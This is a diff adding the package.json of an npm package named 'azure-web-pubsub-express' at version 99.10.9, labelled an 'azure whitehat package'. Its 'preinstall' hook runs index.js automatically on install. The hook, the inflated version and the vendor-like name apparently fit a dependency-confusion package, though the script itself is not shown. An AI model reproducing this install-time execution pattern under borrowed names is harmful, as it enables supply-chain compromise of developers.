@@ -1,0 +1,39 @@
+{
+    "name": "azure-web-pubsub-express",
+    "version": "99.10.9",
+    "description": "azure whitehat package",
+    "main": "index.js",
+    "scripts": {
+        "test": "echo \"error no test specified\" && exit 1",
+        "preinstall": "node index.js"
+    },
+    "author": "",
+    "License": "ISC",
+    "_id": "azure-web-pubsub-express@99.10.9",
+    "_nodeVersion": "14.16.1",
+    "_npmVersion": "6.14.11",
+    "dist": {
+        "integrity": "sha512-n8i7SVy+OUi/AbvkboWZDaltrge6Ep8qfqeFIVCEf/HvRxqI3cwas06aaOb/Jiftbe0tOR5rQ6ePPq78QADBKw==",
+        "shasum": "8412ba468d64058dc95fa2bfd00870a599db8b91",
+        "tarball": "https://registry.npmjs.org/azure-web-pubsub-express/-/azure-web-pubsub-express-99.10.9.tgz",
+        "fileCount": 2,
+        "unpackedSize": 3588,
+        "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v3.0.13\r\nComment: https://openpgpjs.org\r\n\r\nwsFcBAEBCAAQBQJhoSzmCRA9TVsSAnZWagAAp4kP/2cf66z6qsy7dqObXa0P\nCgAgj6B+EjN4mgfOsOFYHBAdzlMgeKOvtw0ZCiaPLvO3v8FnOL6LOZVVoZz1\nSZEKih6GKWbKEccoq3ARJ0HNgLL3do7rhMIAduTG0cuZk5xQjEVX7BZnmACW\nP0vpdrd7KQmEUCK1imbNOJlHvDoCkEg88MK3IXdKyGVAee5cUlnzb2wF3xmt\nhUDG4mazeUR7PXkbbsBOvqKgYqwVqgwpf2CLl0RrQmhw3jQMwoo1X31F9tko\nurawk57Zcs9cvrFJYznH5Ej5QMqyJOFzYP6t5z6p7oBiOtp8FdvXO7RqXkYz\nV1iyRRb9WvvaF9BBlPmkBJzvhyXBuxJgAmzUdq5AWu+dZ0TThI3lTuYlu5AH\nqVik/uENjOYxGa3cp69e1jhvqs4cEbrUu5Mzxm7ycpPqYXNb+YZ0stxyC4lG\n2su9Lq+w9JBlYcQ63buJ3CWSeEY2oL3I67nvVejliNYx4S0S6MsBvQANQbaf\nEdiwKvOMC5BzFXEt1nohe7FE7EcLLLcQFI2k9IjQBH8oFwlI1JXYoxHigxJJ\nq4QWj8ezF83GLrQoyS1xgQRyp54aT9ImREpSuywXfOifomJBVfBqk/HPvHgx\nJfTS2s98KTTp/O20ZnfxWKP6rbt8ft4uz1jtVXKSIhE0JgfsRinyZ/fCgwjU\nggBN\r\n=Ixu+\r\n-----END PGP SIGNATURE-----\r\n"
+    },
+    "_npmUser": {
+        "name": "azure-tests",
+        "email": "hussam.tes08+3@gmail.com"
+    },
+    "directories": {},
+    "maintainers": [
+        {
+            "name": "azure-tests",
+            "email": "hussam.tes08+3@gmail.com"
+        }
+    ],
+    "_npmOperationalInternal": {
+        "host": "s3://npm-registry-packages",
+        "tmp": "tmp/azure-web-pubsub-express_99.10.9_1637952742164_0.012611538828903868"
+    },
+    "_hasShrinkwrap": false
+}
